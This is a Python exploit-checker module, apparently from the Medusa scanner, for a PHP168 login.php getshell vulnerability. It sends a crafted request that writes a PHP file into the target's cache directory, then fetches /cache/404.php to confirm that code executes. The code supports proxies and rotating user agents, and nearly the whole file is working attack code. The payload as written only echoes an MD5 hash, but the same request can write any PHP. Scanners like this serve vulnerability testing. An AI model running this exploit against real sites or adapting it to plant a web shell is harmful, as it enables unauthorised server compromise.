#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: PHP168 login.php GETSHELL漏洞
referer: http://wooyun.org/bugs/wooyun-2014-050515
author: Ascotbe
reference: Lucifer
description: Powered by php168 v6或者一下版本v5、v4、v3、v2、v1会搜索到很多很多相关的网站,login.php文件可以把代码写入cache目录中。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/login.php?makehtml=1&chdb[htmlname]=404.php&chdb[path]=cache&content=<?php%20echo%20md5(1234);?>"
payload2 ="/cache/404.php"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload_url = scheme + "://" + url + payload
        payload_url2 = scheme + "://" + url + payload2
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            resp2 = requests.get(payload_url2, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url, headers=headers, timeout=5, verify=False)
            resp2 = requests.get(payload_url2, headers=headers, timeout=5, verify=False)

        con2 = resp2.text
        code = resp.status_code
        if  con2.lower().find('81dc9bdb52d04dc20036dbd8313ed055')!=-1:
            Medusa = "{} 存在PHP168 GETSHELL漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
    except Exception as e:
        pass